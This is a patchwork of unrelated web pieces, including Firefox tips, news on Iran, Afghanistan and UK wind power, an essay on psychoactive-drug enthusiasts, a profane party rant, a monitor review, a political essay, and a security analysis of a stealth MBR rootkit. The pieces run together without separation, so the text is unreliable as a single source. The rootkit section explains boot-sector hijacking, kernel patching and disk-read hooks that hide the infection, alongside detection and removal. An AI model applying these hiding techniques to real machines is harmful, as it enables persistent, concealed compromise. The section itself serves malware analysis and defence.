Example 2 : Searching for Coup de Grace
You type " Coup de Grace " into the search engine .
You click on the first search result ( should be the best one ) .
You get the Combat Modifiers page .
Hmm . No " Coup de Grace " in sight .
You type " / coup " and presto !
you 're ¾ of the way down the page at the Coup de Grace description .
Tabbed Browsing
Another great feature of Firefox .
It beats the snot out of sticky notes poking out of rulebooks .
During our last game session , I had tabs open for two monsters , three spells , the condition summary , and the splash weapon rules .
There are several keyboard commands for using tabs , but I usually right - click ( Ctl - click on a Mac ) on the link I want , and choose " Open Link in a New Tab " .

TEHRAN ( Reuters ) - Iranian President Mahmoud Ahmadinejad declared victory on Wednesday after a U.S. intelligence report contradicted the Bush administration ’s charge that Iran was actively seeking nuclear weapons .
Slideshow ( 2 images )
“ Today , the Iranian nation is victorious but you have nothing in your hands , ” the president said in a televised speech to a rally in the western Iranian city of Ilam .
The U.S. National Intelligence Estimate ( NIE ) on Monday surprised U.S. friends and foes by saying Iran halted an atomic weapons program in 2003 , contradicting U.S. President George W. Bush ’s charge that Tehran had an active bomb program .
Tehran has already welcomed the report although it insists its nuclear program has never had any military goals .
“ This report ... is announcing a victory for the Iranian nation in the nuclear issue against all international powers , ” the president said .
The NIE report , however , said Iran was continuing to develop the technical means that could be applied to producing weapons .
In response to the report , Bush said Iran remained a danger if it mastered the knowledge to make a nuclear weapon .
The United States said it would continue pushing for a third U.N. sanctions resolution .
Two sets of U.N. sanctions have been imposed so far because Iran has refused to stop uranium enrichment , a process that has both military and civilian uses .
China , which has a U.N. Security Council veto and agreed only reluctantly to earlier sanctions , said “ things have changed ” with the NIE report .
France and Britain , two other permanent council members , said pressure should be kept up .
“ If you want to start a new political game , the united Iranian nation will resist you and will not retreat one step from its program , ” the president said .
“ We will continue our nuclear program and we will not give it up . ”
Ahmadinejad said Iran was ready for talks that were “ honest and cooperative ” on the nuclear program , repeating Iran ’s long - standing call for dialogue to end the row .
The United States has said Iran must first halt uranium enrichment before any formal talks can start .
Tehran has refused to stop , saying such activities are a national right that it will never give up .

And Many More ...
The following is an adaptation of a light - hearted presentation given at the Mindstates Jamaica conference in October 2002 about the role of peers in psychoactive information distribution networks .
It was also published as an article in Trip magazine 's final issue that saw limited distribution .
Everyone knows at least one : the walking encyclopedia of trivia about baseball , film or some other miscellaneous topic .
Even those with no connection to the psychoactive research and user communities are likely to be familiar with the stereotype of the uneducated " druggie " blithely stumbling from one drug experience to the next .
But the pantheon of characters who spend their time immersed in the intricacies of the interface between body and mind is surprisingly diverse .
The lay person can easily fail to recognize the " druggie " in that pharmacology or chemistry student intimately familiar with serotonin - transporter research , or in the talented photographer next door , or perhaps in the exceptionally green - thumbed forensic pathologist .
" Drug Geeks " are individuals who self - identify ( either publicly or privately ) as being knowledgeable about psychoactives .
Their deep interest in the topic makes them avid learners .
When sitting around talking with friends , they get up to find an answer to a question .
They do a web search or look up information in a book .
More than that , they are the ones with the reference books to begin with .
Within any group of friends , they are the individuals whom others go to for questions about psychoactive drugs .
They attend psychoactive - related conferences , meticulously document their own experiences in a journal , read scientific articles , subscribe to psychedelic magazines to keep up with the latest knowledge , or browse trip reports " for fun " .
Drug Geeks do n't necessarily use a lot of psychoactives themselves .
Many fulfill their interest by studying the subject , writing about it , or experiencing it vicariously through the writings of others .
Others enjoy working with extremely mild herbs , supplements , and technologies and prefer to avoid the stronger alterants .
For some people , these can provide a more consistent long - term relationship with psychoactives since they do n't require as much energy and time as buying and ingesting the more socially disapproved plants or chemicals .
The self - taught expert is present in every field of study , within every hobby and every community .
One of the differentiating factors when it comes to psychoactives is the danger ( legally , socially and professionally ) inherent in demonstrating this knowledge and expertise to those outside of the subculture .
This adds a mystery school component to the system , creating secret experts ; by day a normal college student -- by night the leading expert in the Midwest on undetectable dorm room cultivation of psilocybin - containing mushrooms .
One of the drug geek sub -types is the Collector .
This is the individual who collects samples of as many different psychoactives as possible .
They may not care if they have enough for a dose and they may not have any particular interest in ingesting the substances they collect ( they often do n't ) .
Their primary interest is in having a reference sample for their collection .
The first time we encountered this type , a man offered to show us what he called his " baseball card collection " .
From the context of the conversation , it was clear he was talking about psychoactives , but beyond that we had no idea what he meant .
He brought out a small box filled with dozens of carefully labeled plastic bags , vials , and neatly folded bits of tinfoil .
He opened each item , one by one , to show us the small pile of powder , pills , paper , or material inside .
His collection included a wide array of tryptamines , phenethylamines , and curious plant extracts , many of which we had never seen before .
He described when and how he had acquired each , some more than 10 years before .
He waxed nostalgic about the experiences he'd had when ingesting a particular material or about the person from whom he had acquired it .
Many of the items had stories about their provenance : the chemist who made them and how they got from the chemist to him .
He also had empty containers that contained residue of substances from some of his most memorable experiences .
He would smell them and offer whiffs to us as he related their stories .
Since that first encounter more than five years ago , we 've met many other Collectors .
Some specialize in one class of substance , like the person who sent us a photo of his ecstasy tablet collection including dozens of imprints , or the many who collect LSD blotter art , both dipped and un-dipped .
Another Collector we 've encountered has gathered all of the psychoactive chemicals he can find and plans to take a dose of each one and encase it in plastic , creating a collection of desktop paperweights which he thinks -- even with scheduled drugs -- might be quasi-legal .
While the Collector collects objects , the Taster collects experiences .
Tasters are people who want to have tried everything .
They pride themselves on trying as many substances as possible , seeking out and being the first to experience new substances , as well as trying uncommon and interesting combinations .
Often the Tasters do n't ingest any given substance very many times and have no intention of doing so .
Instead , they are connoisseurs of variety .
It is not unusual for the Taster 's excitement to be higher near the beginning of his or her relationship with psychoactives , and so many Tasters are younger with less years of experience under their belts .
But some go on to long careers of methodically finding and trying new substances .
Some Tasters spend their time comparing and contrasting the similarities and subtle differences between the substance they 've tried -- MDA vs. MDMA or 2C - I vs. 2C - B -- while others simply check each substance off their long list after trying it .
But , regardless of whether they are lusting after the elusive mescaline , 4 - methyl - aminorex , or the almost mythical ALD - 52 , what unites Tasters is their desire to try new substances .
The Daredevil shares some characteristics with the Taster , but this type wants to push the limits of experience ( and often of safety ) by doing higher doses and having more mind - bending experiences than others .
Some Daredevils do n't qualify as Drug Geeks at all and are simply thrill seekers , but there are those Daredevils who are actually looking to accumulate knowledge -- part of the definition of a Drug Geek -- by their willingness to push the boundaries ever further .
This type should not be confused with the Hard Head ( who requires higher doses than others to reach comparable effects ) , although they do sometimes overlap .
Plant Geeks are those who focus their attention on the plant kingdom .
Some grow a wide variety of psychoactive plants , while others specialize in a particular genus or in those containing a specific substance .
Plants may be chosen because of their academic , historical , cultural , or metaphysical significance , and again , may not be intended for ingestion .
An earlier interest in ingesting psychoactives may have been transmuted into a longer - term interest in the botany , chemistry , and spirit of the plants .
The relationship between humans and power plants or plant allies is important to many Plant Geeks .
We visited one Plant Geek while we were in a semi-tropical area outside the U.S.
They showed us around their extensive outdoor garden , which included kava kava , Banisteriopsis caapi , Brugmansia , and a variety of other psychoactive plants .
We were shown through their greenhouse , where they allowed us to photograph every plant but one .
We were asked not to take pictures of that specific plant because they had a very special relationship with it which they did not want to endanger .
Another Plant Geek we met had their entire property overgrown with Salvia divinorum .
Hallways and sidewalks were lined with S. divinorum of all sizes , from the smallest cutting ( " please take a couple ! " ) to 9 - foot tall flowering specimens that they were carefully hand - pollinating .
Another had a cactus collection spread across several properties .
New spots were carefully chosen for cuttings and friends were enlisted to help dig , carry , and move them from one location to another .
And then there 's the world of Plant Geeks that focuses entirely on mushrooms and mushroom cultivation .
From local mycology clubs that have substantial numbers of psilocybe - philes to the huge network of amateur and professional mycologists focusing on psychoactive varieties , the mushroom Plant Geek is a surprisingly common breed .
One may focus on perfecting a specific technique for closet cultivation while another combs the local forests to find all the best spots where mushrooms grow in the wild .
One Plant Geek we 've met specializes in developing techniques for outdoor guerrilla planting of Psilocybe species to spots he never plans to harvest : it 's just his own private protest and gift to the world .
It may be surprising that many of these people rarely ( if ever ) ingest any psychoactive plants themselves .
They are often hesitant or unwilling to initiate anyone new , and have no interest in selling anything .
One myco - geek we met enjoys the process of growing for its own sake : he figures out how to cultivate new psilocybin - producing species , gets them to fruit , writes up his notes , buries the fruit , then starts again with a new species .
One of the more prominent geek types is the Chemistry Geek .
Everyone involved in studying psychoactives for long will eventually meet one .
They range from the undergrad who dreams of mastering LSD synthesis to the professional PhD with 40 years of bench experience .
They can often be identified by the bits of paper in their pockets covered with arachnoid scribblings of new molecules , analytical results , or synthesis steps .
While at Burning Man 2001 , we were asked by a visitor if we could show them the structure of 4 - methyl - aminorex .
We were unable to find the structure in our small on - playa library and also failed to find anyone else familiar with it .
This failure came up in conversation at Burning Man 2002 as we sat talking to a friendly chemist - type who stopped by our dome .
He knew the 4 - methyl - aminorex structure and drew it on the white board we kept strapped to the wall , then went on his way .
A different chemist , who stopped by the dome later that day , recognized the molecule ( despite it not being labeled ) and commented that he'd been thinking about the 4 - methyl - aminorex synthesis process for a while but was still missing one part .
He spent 15 minutes carefully drawing a series of steps for a potential synthesis path , leaving a large space in the middle marked with a question mark .
Another day passed and a third chemist dropped in , pausing in front of the whiteboard .
Noting the missing step , he commented " oh that step is easy " , erased the question mark and replaced it with another drawing of some benzene ring and squiggly lines and letters .
Soon afterwards the chemist who had drawn the original synthesis returned to find his drawing completed .
He got very excited and happily exclaimed " Yes , yes !
I think that would probably work !
" For those of us who have only a passing familiarity with organic chemistry or those for whom " the tryptamine backbone " is a meaningless phrase , the cryptic language of the Chemistry Geek is something to be experienced aesthetically .
It seems a mix of technology and magic , somehow both modern and medieval in its translation from flask to writing and back again .
There is something smile - inducing about watching Sasha Shulgin wave his arms as he talks about the " dirty pictures " of organic chemistry or listening to experienced chemists as they chatter at high speed in an alchemical dialect known only to themselves .
The Chemistry Geek is perhaps one of the most heralded of the drug geeks , both within the subculture and in the mainstream .
There are PhD programs and a large pharmaceutical industry that spur them on to new heights .
It 's one of the few drug geek subtypes that can reliably lead to a well paid career , although most Chemistry Geeks must keep their less - approved interests very quiet lest they attract unwanted attention and scrutiny .
There are also those who prefer photographs of psychoactive plants and chemicals to the substances themselves .
Like mainstream mycological photographers we 've met who do n't particularly care for eating mushrooms , there are those who spend their time and energy seeking plants with psychoactive properties to capture as images .
One of the benefits of this flavor of obsession is that it avoids some of the potential legal risks incurred by the geek types that like to handle , collect , or produce controlled substances .
Fire and I certainly qualify as Photo Geeks .
My first thought when someone talks about a substance they 've tried or a plant they 're growing is to self - consciously wonder how rude it would be to ask if we could take a picture of it .
" Where 's the camera ? " runs through my mind along with " I wonder if the scanner is in the car …
" At an outdoor all - night dance party a few years ago , a cute young female came up to us and asked us if we wanted any E .
As a part of our process of watching and documenting the psychoactive - using subculture , we asked if she was selling any other substances .
She replied that she also had 2C - B . I told her " We 're not interested in buying any , but how would you feel if we took some pictures of what you 've got ? "
She was initially a little put off by our request , but she called over her boyfriend to consult .
We got into a long conversation about their strange underground business of supplying psychoactives at parties , about the ethics of selling , and about their belief that their work helped strengthen the community .
After talking , he was happy to let us take pictures of his wares , so we then spent thirty minutes in a corner photographing their nice individually labeled 22.5 mg vials of 2C - B .
These are only some of the more common varieties of specialist Drug Geeks .
Perhaps the most common Drug Geek is the Generalist who is at heart interested in how psychoactives are ( mis)used and ( mis ) understood by society , and who enjoys discovering and promulgating factual information .
The Supplement Geek knows just the right combination of vitamins , minerals or nutraceuticals to pre-load for trips , improve effects , soften the comedown , recharge the day after , or rebalance the system .
The Law Geek reads every related court opinion , monitors ongoing cases , knows the flaws and vagaries of every psychoactive related law , and stays abreast of the minutiae of Federal Register filings by the DEA .
The Music Geek collects traditional music like icaros and songs from the ayahuasca churches , tracks which music is best to accompany each type of experience , or writes their own to fill in where lacking .
The History Geek knows the origins of specific substances , which plants were traditionally used by which culture , who first synthesized psilocybin and in what year , when mescaline was scheduled , and what government organization was in charge of drug laws at the time .
The Art Geek keeps their finger on the pulse of psychoactive art : who keeps the best collections , where there are current showings , whose art has been used on LSD blotter .
And the list goes on and on .
Regardless of the subject matter , specialists such as those described above serve an important purpose .
Without attention from aficionados who focus intensely on the unique and obscure details of a given field of knowledge , that knowledge stagnates .
It often seems to be the large corporations , institutions , and big dollars that drive the advancement of knowledge , but behind these are key individuals with a keen interest in learning , teaching , archiving , or documenting .
Whether they work in a field where they are well paid , or one where they volunteer , it is these information geeks that push the boundaries of knowledge and understanding .

The aim is for 20 % of EU energy to come from renewables by 2020 .
Up to 7,000 turbines could be installed to boost wind produced energy 60 - fold by 2020 .
The business secretary admitted it would change Britain 's coastline , and mean higher electricity bills .
Senior Tory Alan Duncan backed the plans , adding : " We 're an island nation .
There 's a lot of wind around . "
Mr Hutton said there would have to be a switch to low - carbon energy production to combat the threat of climate change .
Coastline ' will change '
" But if we could manage to achieve this , by 2020 enough electricity could be generated off our shores to power the equivalent of all of the UK 's homes , " he told a European energy industry conference in Berlin .
We do know that if wind farms are put in silly places they can kill lots of birds , they scare off whales and dolphins and fish

Wind turbines in graphics Analysis : Wind power plan
" This could be a major contribution towards meeting the EU 's target of 20 % energy from renewable sources by 2020 .
" The challenge for the government and for industry is to turn this potential - for our energy and economy - into a cost - effective reality .
" Next year we will overtake Denmark as the country with the most offshore wind capacity . "
Just 2 % of Britain 's power comes from renewable sources , and wind is the source for around 2.2 gigawatts .
Calm days ?
The government hopes that it could provide around 33 gigawatts by 2020 , which would mean introducing some 7,000 turbines .
Mr Hutton conceded that having a wind installation every half - mile around the coast was " going to change our coastline " .
HAVE YOUR SAY
Wind farms ?
Excellent idea - now just get on with it and stop faffing about

Wind turbines : your views
" There is no way of making the shift to low - carbon technology without making a change and that change being visible to people , " he said .
" We 've got a choice as a country whether we rise to the challenge ... or stick our head in the sand and hope it ( climate change ) goes away .
It is not going to go away . "
Asked what would happen if there was no wind for a few days , Mr Hutton said that was why there had to be a mix of energy sources - including nuclear power - to cover for calmer weather periods .
' Aspirational targets '
He also said he wanted the UK to be self - sufficient in energy : " I do not want in 20 years ' time to find that whether the lights go on in the morning is down to some foreign government . "
The first tranche of offshore wind farms began in 2001 , followed by a second wave two years later in the Thames Estuary , the Greater Wash and the North West .
The engineering effort to build 7,000 large offshore turbines by 2020 would be enormous , unprecedented and is probably underestimated
Sue Ion
Royal Academy of Engineering
Q&A : Offshore wind farms
Some eight gigawatts of capacity could be up and running by 2014 , including the one gigawatt London Array , the biggest offshore wind farm in the world .
In Berlin , Mr Hutton said the next stage in the expansion of offshore wind power would open up the vast bulk of the UK 's continental shelf to large scale development .
However , the Royal Academy of Engineering said it was so concerned about the UK 's ability " to meet these aspirational targets " it was starting a new study on the engineering challenges of offshore wind projects to report next year .
Wind ' ca n't do it all '
" We applaud any initiative to boost the contribution of renewable energy sources within a balanced energy portfolio , " said Sue Ion , vice president of the academy .
" However , wind power cannot provide all our electricity - the engineering effort to build 7,000 large offshore turbines by 2020 would be enormous , unprecedented and is probably underestimated . "
And Mark Avery , from the Royal Society for the Protection of Birds , said : " We do know that if wind farms are put in silly places they can kill lots of birds , they scare off whales and dolphins and fish . "
Shadow business secretary Mr Duncan said the UK should use its offshore capacity for generating electricity " that 's clean and secure " .
" So yes , I think it 's inevitable and a good thing that there will be more offshore wind . "
' Enormous ' potential
Chris Huhne , the Lib Dems ' environment spokesman , said : " This is a welcomed change in tone from the government , but ministers need to pay households to install micro-generators and also invest in big schemes like the Severn Barrage which alone could generate 5 % of our electricity needs . "
Friends of the Earth renewable energy campaigner Nick Rau said the potential for wind power was " enormous " .
Greenpeace executive director John Sauven said the plans amounted to a " wind energy revolution " but stressed that premium prices needed to be guaranteed for clean electricity .
Carbon trust chief executive Michael Rea said the plans would " require substantial investment before it can be realised at this scale " .
Maria McCaffery , chief executive of the British Wind Energy Association , said : " All we 're really talking about is harnessing our tremendous natural resource . "
Afghanistan Now Most Dangerous for U.S. Troops Danger for U.S. troops in Afghanistan is rising , with 2007 the deadliest year .
Nov. 30 , 2007  --
In a stunning turnaround , Afghanistan is now a more dangerous place for U.S. troops than Iraq .
The death rate for U.S. troops in Afghanistan is now nearly twice the rate for those in Iraq , according to an analysis by ABC News .
It 's a good news / bad news story .
On one hand , security in Iraq has dramatically improved and as a result the number of U.S. troops killed and wounded has dropped considerably .
October and November have been two of the least deadly months in Iraq since the invasion in March 2003 .
In fact , it 's the lowest two - month total of U.S. combat deaths in Iraq in nearly three years .
( Not since January - February 2004 have fewer U.S. troops died in a two - month period ) .
For the 23,000 Marines in Iraq , most of whom operate in Anbar province , the improvement has been especially dramatic .
No Marine has been killed in combat in Iraq since Lance Cpl. Jeremy W. Burris of Tacoma , Wash . , was shot in Anbar Oct. 8 ( although just a few days ago a Marine was killed in a vehicle accident ) .
In fact , with the month of November nearly over , not a single U.S. soldier has been killed in action in all of Anbar province .
On the other hand , the situation has deteriorated in Afghanistan .
There have already been 111 U.S. troops killed in Afghanistan in 2007 , making this the deadliest year for U.S. troops in Afghanistan of the entire war .
" We are stagnating in Afghanistan , if not backsliding , " a senior U.S. military official tells ABC News .
It 's also the deadliest year for non-U.S. troops , by far .
This year , 112 non-U.S. troops in the coalition have been killed , including 40 from Britain and 29 from Canada .
So far in November , 22 coalition troops have been killed in Afghanistan , 11 of them Americans .
Considering that there are only 26,000 U.S. troops in Afghanistan , compared to over 160,000 in Iraq , the death rate is considerably higher in Afghanistan .
As for the success in Iraq , officials caution that the situation can change quickly .
" There are too many uncontrollable variables in Iraq to predict what is going to happen in the coming months , " said coalition spokesman Rear Adm.
Gregory Smith .
On December 31st , Tracie Egan aka SlutMachine , a Jezebel writer and very well put - together woman ( see photograph ) , hosted a party at her house .
She even held a contest to be her date .
We did n't go but apparently we missed some serious partying because today we got a very angry email / blog post .
from her in which the phrase " passed out " " puked " and " Paypal " appear numerous times .
Apparently her house is a mess .
There 's glitter on the floor , wine on the walls and a tampon on the couch .
She needs help ( $ $ $ ) cleaning up .
As far as post - bacchanal pleas for renumeration go , this is tops and surely will be used as a template for other disgruntled party - throwers who happened to puke and pass out before someone spilled wine on their signed Dolly Parton poster .
Now Egan is out $ 450 , there 's a hole in her wall and her " ass is really fucked up . "
Full tirade / plea / amazing artifact of our generation after the jump .
So actually this is also on her blog with pictures but it is somehow more satisfying , at least to me , to read it without the pictures and to create them in your mind .
Before I get started , just know that the cleaning service I called gave me an estimate of $ 450 .
Since most of the damage happened after I passed out , I 'm not footing this entire bill .
In all the years that I 've had parties , I 've never so much as even asked for someone to stay and help me clean up , let alone chip in for any of the booze or anything .
But today , I 'm livid .
The people who fucked up my shit know who you are .
You have to give me something .
I do n't care if you 're poor .
If you can't afford to be an asshole , than you should n't act like one .

I 've hosted lots of parties in my day , but nothing — nothing — has ever even neared the level of destruction ( and blatant disrespect ) that happened at my place after I puked and passed out last night .
Seriously , this beats out the time that I had a party when my parents went away when I was 17 and Amanda Spence fell down the steps and broke the spokes of the wooden banister , as well as her cheek bone .
I understand you guys are party animals , but frankly , I think that some of you are just plain animals .
Like wine spilled all over the walls ?
Are you kidding me ?
And it got on my signed Dolly Parton poster , which as some of you know , is one of my most prized possessions in the world .
I heard that Callie fell down the stairs , so I 'm assuming that she did this .
I also heard that someone poured champagne from the second floor into the Callie 's mouth on the first floor .
You know , that really fucking pisses me off .
There 's a fucking television and speakers right there that it could 've gotten on , you shit slices .
And I know that if that stuff got destroyed , your asses would not compensate me in any way beyond a " Sorry dude . "
I would never do that in someone 's house , whether it 's a dump , squat , dorm room or mansion .
I wanted people to have a good time .
I went out of my way for people to have a good time , and it pisses me off that it was my friends , not strangers , who were doing this shit .
I expected a huge mess when I woke up this morning , and expected to do heavy duty cleaning , but this is unreal .
I 'm fucking pissed .
And who 's the asshole who poured beer all over himself ?
Was that you , Brian ?
It smells like mildew in here now .
I do n't know what the hell was going on in the bathroom downstairs ( I do however know about a blow job that went on in the bathroom upstairs ... not performed by me ) , but the shower curtain rod was pulled out of the wall and the rings are broken .
The kitchen suffered damages as well .
There 's a hole in the wall , too .
It 's blurry , but it 's there .
I take responsibility for the floors , since the glitter was my idea .
It was really pretty when those things popped off .
Oh , and you can't really tell from this picture , but that 's an o.b. tampon on my couch .
For you boys that do n't know , those are the kind you have to finger yourself to use .
I do n't use them because I do n't wash my hands after I use the bathroom .
Anyway , Happy New Year to you all !
Even to the assholes who wrecked my place and to the assholes who were the last to leave and left the fucking front door wide open for the entire place to be burgled .
I woke up at like 5 am because someone kept calling my phone repeatedly because he thought he left his gloves here .
Apparently it was urgent for him to get them , but I 'm glad he called , because otherwise , I would 've slept through the night with the roof door and the apartment door open .
Also , my ass has the biggest bruise on it and I can't really walk .
And this happened to my arm :
I am unable to move .
Seriously , my ass is really fucked up .
I can't bend over , which is why I called a cleaning service to come here , because it is not humanly possible for me to do this alone .
I did n't even include the roof pictures , because there was a pile of chunky puke up there , and as a hangover present , I decided to not include that .
Click to viewDell has flaunted this gorgeous monitor for a while in various trade shows and press events , always saying that it 's just a design concept and not available yet .
That all changes now , because the 22 - inch Dell Crystal LCD display is suddenly a real product .
Just in time for CES , this beauty is set to ship in the next few days , and even though its spec list is n't as high - end as we had hoped , it 's still so pretty , if it were smaller we'd want to wear it as a necklace .

This widescreen monitor has a 1680x1050 ( WSXGA + ) rez , not quite the 1920x1200 we favor , but its quoted 2 ms response time is respectable .
An unusual touch are those four speakers , the first ones to be built into a Dell monitor , with their visible wiring and output for an outboard subwoofer .
There 's also a tiny webcam mounted top center , and speakers , webcam , DVI , and HDCP - compliant HDMI ( no mention of DisplayPort ) connectivity are all contained in one cable .
Also impressive is its TrueColor Technology with 98 percent color gamut , along with a 2000:1 dynamic contrast ratio .

We 're also crazy about its floating 4 mm - thin tempered glass design and polished metal tripod stand , but we 're slightly disappointed that this style , with its extra wide ( albeit crystal clear ) bezel is not exactly conducive to dual - monitor configurations .
Appearances must be important to you if you 're thinking about snagging one of these jewels , because it 'll cost you $ 1199 , a far cry from the $ 300 price of Dell 's other 22 " 1680x1050 LCDs , which display lower contrast and fewer colors .
But then , buyers of this limited - edition monitor are n't going to be bargain hunters , anyway .
Overall , it 's a gorgeous display from Dell , further demonstrating the company 's determination to incorporate forward design into its erstwhile staid product line .
[ Dell Crystal ]
By far the most significant consequence of " selfish capitalism " ( Thatch / Blatcherism ) has been a startling increase in the incidence of mental illness in both children and adults since the 1970s .
As I report in my book , The Selfish Capitalist - Origins of Affluenza , World Health Organisation and nationally representative studies in the United States , Britain and Australia , reveal that it almost doubled between the early 80s and the turn of the century .
These increases are very unlikely to be due to greater preparedness to acknowledge distress - the psychobabbling therapy culture was already established .
Add to this the astonishing fact that citizens of Selfish Capitalist , English - speaking nations ( which tend to be one and the same ) are twice as likely to suffer mental illness as those from mainland western Europe , which is largely Unselfish Capitalist in its political economy .
An average 23 % of Americans , Britons , Australians , New Zealanders and Canadians suffered in the last 12 months , but only 11.5 % of Germans , Italians , French , Belgians , Spaniards and Dutch .
The message could not be clearer .
Selfish Capitalism , much more than genes , is extremely bad for your mental health .
But why is it so toxic ?
Readers of this newspaper will need little reminding that Selfish Capitalism has massively increased the wealth of the wealthy , robbing the average earner to give to the rich .
There was no " trickle - down effect " after all .
The real wage of the average English - speaking person has remained the same - or , in the case of the US , decreased - since the 1970s .
By more than halving the taxes of the richest and transferring the burden to the general population , Margaret Thatcher reinstated the rich 's capital wealth after three postwar decades in which they had steadily become poorer .
Although I risk you glazing over at these statistics , it 's worth remembering that the top 1 % of British earners have doubled their share of the national income since 1982 , from 6.5 % to 13 % , FTSE 100 chief executives now earning 133 times more than the average wage ( against 20 times in 1980 ) ; and under Brown 's chancellorship the richest 0.3 % nobbled over half of all liquid assets ( cash , instantly accessible income ) , increasing their share by 79 % during the last five years .
In itself , this economic inequality does not cause mental illness .
WHO studies show that some very inequitable developing nations , like Nigeria and China , also have the lowest prevalence of mental illness .
Furthermore , inequity may be much greater in the English - speaking world today , but it is far less than it was at the end of the 19th century .
While we have no way of knowing for sure , it is very possible that mental illness was nowhere near as widespread in , for instance , the US or Britain of that time .
What does the damage is the combination of inequality with the widespread relative materialism of Affluenza - placing a high value on money , possessions , appearances and fame when you already have enough income to meet your fundamental psychological needs .
Survival materialism is healthy .
If you need money for medicine or to buy a house , becoming very concerned about getting them does not make you mentally ill .
But Selfish Capitalism stokes up relative materialism : unrealistic aspirations and the expectation that they can be fulfilled .
It does so to stimulate consumerism in order to increase profits and promote short - term economic growth .
Indeed , I maintain that high levels of mental illness are essential to Selfish Capitalism , because needy , miserable people make greedy consumers and can be more easily suckered into perfectionist , competitive workaholism .
With overstimulated aspirations and expectations , the entrepreneurial fantasy society fosters the delusion that anyone can be Alan Sugar or Bill Gates , never mind that the actual likelihood of this occurring has diminished since the 1970s .
A Briton turning 20 in 1978 was more likely than one doing so in 1990 to achieve upward mobility through education .
Nonetheless , in the Big Brother / It Could Be
You society , great swaths of the population believe they can become rich and famous , and that it is highly desirable .
This is most damaging of all - the ideology that material affluence is the key to fulfilment and open to anyone willing to work hard enough .
If you do n't succeed , there is only one person to blame - never mind that it could n't be clearer that it 's the system 's fault , not yours .
Depressed or anxious , you work ever harder .
Or maybe you collapse and join the sickness benefit queue , leaving it to people shipped in to do the low - paid jobs that society has taught you are too demeaning - let alone the unpaid ones , like looking after children or elderly parents , which are beneath contempt in the Nouveau Labour liturgy .
There is much tearing of hair across the media and advocacy of nose - pegging on these pages of the " grin and bear it " variety .
In fact , there is an alternative .
We desperately need - and before long , I predict we will get - a passionate , charismatic , probably female leader who advocates the Unselfish Capitalism of our neighbours .
The pitch is simple .
Not only would reduced consumerism and greater equality make us more ecologically sustainable , it would halve the prevalence of mental illness within a generation .

Stealth MBR rootkit
Jan 2th , 2008
In 2005 Derek Soeder and Ryan Permeh , researchers from eEye Digital Security , presented eEye BootRoot .
The technique used in their project was n't new and had been popular in DOS times , but they first successfully used it in Windows NT Environment .
The eEye Digital Security researchers skipped one part - BootRoot did n't hide the real content of affected sectors like old DOS Stealth MBR viruses , but it had only been created to show the possible way to compromise Windows NT OS .
Unfortunately , all the Windows NT family ( including VISTA ) still have the same security flaw - MBR can be modified from usermode .
Nevertheless , MS blocked write - access to disk sectors from userland code on VISTA after the pagefile attack , however , the first sectors of disk are still unprotected !
Rootkit in the wild
At the end of 2007 stealth MBR rootkit was discovered by MR Team members ( thanks to Tammy & MJ ) and it looks like this way of affecting NT systems could be more common in near future if MBR stays unprotected .
" Good points " of being MBR rootkit :
full control of machine boot process - code is executed before the OS starts rootkit does not need a file - code could exists in some sectors of the disk and it cannot be deleted as a usual file rootkit does not need any registry entry because it is loaded by MBR code to hide itself , rootkit needs to control only a few sectors of the disk
How MBR rootkit works :
Installer MBR loader Kernel patcher Kernel driver loader Sectors hider / protector Kernel driver Detection Rootkit removal
Installer
The installer of the rootkit writes the content of malicious kernel driver ( 244 736 bytes ) to the last sectors of the disk ( offset : 2 142 830 592 ) and then modifies sectors 0 ( MBR ) , 60 , 61 and 62 .
The content of hidden sectors :
0 - MBR rootkit loader 61 - kernel part of loader 62 - copy of original MBR
Below , the " Process Monitor " log shows sectors modified by the rootkit installer :

MBR loader
The Rootkit dropper overwrites original MBR code and stores a copy in sector 62 .
The author of rootkit mostly used MBR loader code developed by eEye researchers , however the original code has been modified to patch the Windows kernel instead of NDIS driver .

Kernel patcher
MBR rootkit loader hooks INT 0x13 to control content of sectors loaded by NTLDR .
It patches two areas of the kernel : the first contains the call of nt !
IoInitSystem function and the second is the last page of the kernel image .
At the beginning of start - up rootkit calls original nt !

Sectors hider / protector
To hide the real content of MBR and other sectors from AV scanners rootkit hooks " \ Driver \ Disk " IRP_MJ_READ .
Normally , when API reads sector 0 ( MBR ) , rootkit modifies disk IRP_MJ_READ call and returns copy of original MBR stored in sector 62 .
The second hook ( IRP_MJ_WRITE ) protects it from being deleted / overwritten .

The detection method could be based on cross-view comparison of MBR sector .
The userland part can use Windows API functions to read a fake content of MBR : h File = CreateFile ( " \\\\.\\PHYSICALDRIVE0 " , GENERIC_READ , ... ReadFile ( h File , Buffer , 512 , ... and the kernel part of the scanner could read MBR by using original pointer of \ Driver \ Disk -> MajorFunction [IRP_MJ_READ ] = CLASSPNP!ClassReadWrite .
If the content of sectors is not identical , the machine has been infected .
Rootkit removal
To remove rootkit from infected machine you can simply use " Recovery Console " command : fixmbr .

Update - mat25.exe Feb 10th , 2008
After a month , the author of the rootkit , released improved version of the malware .
The main part of rootkit is almost identical to the previous one , and the changes concerning the installer .

The previous version of the installer was modifying disk sectror via the standard Windows API functions .
This method of infection of the MBR could be easly intercept by security applications , so the latest version uses special driver developed for the direct disk sectors access .

When we are thinking , how to ensure protection against this threat , we should remember , that BIOS MBR protections and all software based solutions could failed , when the attacker will move malicious code from the MBR to the partition boot record .
The partition boot record has the same potential like MBR and also could be used to compromise the OS .
Hopefully , new technologies like TPM will help improve the security .
Update Mar 26th , 2008
The author of the rootkit released another improved version of the malware .
The rootkit gang decided to continue " mouse and cat game " , and to be more effective against AV scanners and removal tools , the changes concerning the MBR sector code , as well as now malware uses few tricks to cheat removal tools .

To deceive few available detection / removal tools ( including GMER ) new version of rootkit modifies original pointers to CLASSPNP !ClassReadWrite in CLASSPNP.SYS !ClassInitialize function and pointers of \ Device \CdRom0 MajorFunction table .
The previous version of GMER finds original pointer of CLASSPNP !
ClassReadWrite in \ Device \CdRom0 MajorFunction table , so now , it cannot read infected MBR .
However , all these new malware tricks will imply more changes visible in the log - see below old GMER 1.0.12 scan .

CNN :
The CIA asked the Justice Department to investigate whether former operative John Kiriakou illegally disclosed classified information when he talked about the waterboarding of a terrorism suspect , government officials say .
That revelation has prompted new calls for investigations on Capitol Hill .
The Bush administration appeared in U.S. District Court on Friday to answer a judge 's questions about the tapes ' destruction .
Speaking to CNN last week , Kiriakou said that U.S. interrogators drew valuable information from al Qaeda captive Abu Zubayda by " waterboarding " him .
But Kiriakou said the procedure amounts to torture and should be stopped .

